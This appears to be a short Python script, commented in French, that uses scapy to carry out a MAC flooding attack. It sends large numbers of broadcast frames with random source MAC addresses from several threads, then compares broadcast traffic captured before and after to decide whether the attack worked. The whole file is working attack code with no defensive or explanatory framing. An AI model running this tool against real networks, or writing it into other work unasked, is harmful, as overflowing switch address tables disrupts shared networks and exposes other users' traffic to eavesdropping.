import random
from scapy.all import sendp, sniff, RandMAC
from scapy.layers.l2 import Ether
from concurrent.futures import ThreadPoolExecutor

class MacFlooding:
    def __init__(self, interface, num_packets, num_threads):
        self.interface = interface
        self.num_packets = num_packets
        self.num_threads = num_threads

    # Envoie un paquet avec une adresse MAC source aléatoire et une adresse MAC de destination de diffusion
    def _send_packet(self):
        src_mac = RandMAC()
        dst_mac = "ff:ff:ff:ff:ff:ff"
        packet = Ether(src=src_mac, dst=dst_mac) / "\x00" * 46
        sendp(packet, iface=self.interface, verbose=False)

    # Effectue l'inondation de MAC en utilisant plusieurs threads pour envoyer les paquets
    def flood(self):
        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            for _ in range(self.num_packets):
                print(_)
                executor.submit(self._send_packet)

    # Capture les paquets de diffusion et retourne leur nombre
    def _capture_broadcast_packets(self, timeout):
        broadcast_packets = sniff(filter="ether dst ff:ff:ff:ff:ff:ff", iface=self.interface, timeout=timeout)
        return len(broadcast_packets)

    # Exécute l'attaque et vérifie si elle a réussi en comparant le nombre de paquets de diffusion capturés avant et après l'attaque
    def run(self):
        num_broadcast_packets_before = self._capture_broadcast_packets(timeout=10)
        self.flood()
        num_broadcast_packets_after = self._capture_broadcast_packets(timeout=10)
        if num_broadcast_packets_before and num_broadcast_packets_after:
            if num_broadcast_packets_after - num_broadcast_packets_before >= 1.5 * num_broadcast_packets_before:
            #Si cela a marché
                return True
            else:
            #Sinon
                return False
        else:
            return "Error capturing broadcast packets. MAC flooding attack unsuccessful."
